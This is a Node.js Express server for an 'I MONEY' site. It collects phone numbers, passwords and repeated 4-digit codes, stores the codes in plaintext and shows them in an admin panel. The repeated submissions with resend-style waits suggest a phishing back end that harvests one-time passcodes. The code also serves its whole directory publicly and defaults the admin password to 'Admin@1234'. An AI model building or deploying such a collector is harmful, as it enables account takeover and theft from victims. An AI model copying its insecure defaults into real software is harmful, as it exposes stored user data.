require("dotenv").config();
const express = require("express");
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const cookieParser = require("cookie-parser");

const app = express();
const PORT = process.env.PORT || 3000;
const JWT_SECRET = process.env.JWT_SECRET || crypto.randomBytes(32).toString("hex");
const COOKIE_NAME = "imoney_admin_token";
const DATA_FILE = path.join(__dirname, "data.json");

const ADMIN_EMAIL = (process.env.ADMIN_EMAIL || "admin@imoney.local").trim().toLowerCase();
const ADMIN_PASSWORD_HASH = process.env.ADMIN_PASSWORD_HASH
  ? process.env.ADMIN_PASSWORD_HASH
  : bcrypt.hashSync(process.env.ADMIN_PASSWORD || "Admin@1234", 10);

app.use(express.json({ limit: "256kb" }));
app.use(cookieParser());
app.use(express.static(__dirname));

function ensureDataFile() {
  if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, JSON.stringify({ users: [] }, null, 2), "utf8");
  }
}

function readData() {
  ensureDataFile();
  try {
    const raw = fs.readFileSync(DATA_FILE, "utf8");
    const parsed = JSON.parse(raw);
    if (!parsed || !Array.isArray(parsed.users)) {
      return { users: [] };
    }
    return parsed;
  } catch (err) {
    return { users: [] };
  }
}

function writeData(data) {
  ensureDataFile();
  const tempFile = `${DATA_FILE}.${process.pid}.${Date.now()}.tmp`;
  fs.writeFileSync(tempFile, JSON.stringify(data, null, 2), "utf8");
  fs.renameSync(tempFile, DATA_FILE);
}

function setAuthCookie(res, token) {
  const isProd = process.env.NODE_ENV === "production";
  res.cookie(COOKIE_NAME, token, {
    httpOnly: true,
    sameSite: "lax",
    secure: isProd,
    maxAge: 24 * 60 * 60 * 1000,
    path: "/"
  });
}

function requireAdmin(req, res, next) {
  const token = req.cookies && req.cookies[COOKIE_NAME];
  if (!token) {
    return res.status(401).json({ error: "Unauthorized" });
  }
  try {
    const payload = jwt.verify(token, JWT_SECRET);
    if (!payload || payload.role !== "admin") {
      return res.status(403).json({ error: "Forbidden" });
    }
    req.admin = payload;
    return next();
  } catch (err) {
    return res.status(401).json({ error: "Session expired" });
  }
}

function getCooldownSeconds(attemptNumber) {
  if (attemptNumber === 1) return 59;
  if (attemptNumber === 2) return 59;
  if (attemptNumber >= 3) return 90;
  return 59;
}

app.get("/", (req, res) => {
  const regPath = path.join(__dirname, "registration.html");
  if (fs.existsSync(regPath)) {
    return res.sendFile(regPath);
  }
  return res.status(200).send("I MONEY server running");
});

app.post("/api/user/register", async (req, res) => {
  try {
    const { phone, password, code } = req.body || {};
    const cleanPhone = String(phone || "").replace(/\D/g, "").trim();
    const cleanPassword = String(password || "");
    const cleanCode = String(code || "").replace(/\D/g, "").trim();

    if (!/^\d{10}$/.test(cleanPhone)) {
      return res.status(400).json({ error: "Please enter a valid 10-digit phone number." });
    }
    if (cleanPassword.length < 6) {
      return res.status(400).json({ error: "Password must be at least 6 characters." });
    }
    if (!/^\d{4}$/.test(cleanCode)) {
      return res.status(400).json({ error: "Please enter a valid 4-digit code." });
    }

    const db = readData();
    const now = Date.now();
    let user = db.users.find((u) => u.phone === cleanPhone);

    if (user && user.cooldownUntil && now < user.cooldownUntil) {
      const remainingSeconds = Math.ceil((user.cooldownUntil - now) / 1000);
      return res.status(429).json({
        error: `Please wait ${remainingSeconds}s before submitting again.`,
        cooldownSeconds: remainingSeconds
      });
    }

    const passwordHash = await bcrypt.hash(cleanPassword, 10);

    if (!user) {
      user = {
        id: crypto.randomUUID(),
        phone: cleanPhone,
        passwordHash,
        codes: [cleanCode],
        attempts: 1,
        cooldownSeconds: 59,
        cooldownUntil: now + 59 * 1000,
        createdAt: new Date(now).toISOString(),
        updatedAt: new Date(now).toISOString()
      };
      db.users.unshift(user);
    } else {
      const nextAttempt = (Number(user.attempts) || 0) + 1;
      const cooldownSec = getCooldownSeconds(nextAttempt);
      const updatedCodes = Array.isArray(user.codes) ? [...user.codes] : [];
      if (updatedCodes.length < 3) {
        updatedCodes.push(cleanCode);
      } else {
        updatedCodes[2] = cleanCode;
      }

      user.passwordHash = passwordHash;
      user.codes = updatedCodes;
      user.attempts = Math.min(nextAttempt, 3);
      user.cooldownSeconds = cooldownSec;
      user.cooldownUntil = now + cooldownSec * 1000;
      user.updatedAt = new Date(now).toISOString();
    }

    writeData(db);

    return res.status(200).json({
      message: "Registered successfully.",
      phone: user.phone,
      attempt: user.attempts,
      cooldownSeconds: user.cooldownSeconds
    });
  } catch (err) {
    return res.status(500).json({ error: "Server error while registering user." });
  }
});

app.post("/api/admin/login", async (req, res) => {
  try {
    const { email, password } = req.body || {};
    const cleanEmail = String(email || "").trim().toLowerCase();
    const cleanPassword = String(password || "");

    if (!cleanEmail || !cleanPassword) {
      return res.status(400).json({ error: "Email and password are required." });
    }

    const emailMatches = cleanEmail === ADMIN_EMAIL;
    const passwordMatches = await bcrypt.compare(cleanPassword, ADMIN_PASSWORD_HASH);

    if (!emailMatches || !passwordMatches) {
      return res.status(401).json({ error: "Invalid admin credentials." });
    }

    const token = jwt.sign(
      { role: "admin", email: ADMIN_EMAIL },
      JWT_SECRET,
      { expiresIn: "24h" }
    );
    setAuthCookie(res, token);

    return res.status(200).json({
      message: "Login successful.",
      admin: { email: ADMIN_EMAIL }
    });
  } catch (err) {
    return res.status(500).json({ error: "Login failed." });
  }
});

app.get("/api/admin/me", requireAdmin, (req, res) => {
  return res.status(200).json({
    authenticated: true,
    admin: { email: req.admin.email }
  });
});

app.post("/api/admin/logout", (req, res) => {
  res.clearCookie(COOKIE_NAME, { path: "/" });
  return res.status(200).json({ message: "Logged out." });
});

app.get("/api/admin/users", requireAdmin, (req, res) => {
  const db = readData();
  const now = Date.now();
  const users = db.users.map((u) => {
    const remainingCooldown = u.cooldownUntil && now < u.cooldownUntil
      ? Math.ceil((u.cooldownUntil - now) / 1000)
      : 0;
    return {
      id: u.id,
      phone: u.phone,
      codes: Array.isArray(u.codes) ? u.codes : [],
      attempts: u.attempts || 0,
      remainingCooldown,
      createdAt: u.createdAt,
      updatedAt: u.updatedAt
    };
  });
  return res.status(200).json({ users });
});

app.delete("/api/admin/users/:id", requireAdmin, (req, res) => {
  const userId = String(req.params.id || "");
  const db = readData();
  const initialLength = db.users.length;
  db.users = db.users.filter((u) => u.id !== userId);

  if (db.users.length === initialLength) {
    return res.status(404).json({ error: "User not found." });
  }

  writeData(db);
  return res.status(200).json({ message: "User deleted." });
});

app.listen(PORT, () => {
  ensureDataFile();
  console.log(`I MONEY server running at http://localhost:${PORT}`);
});
        
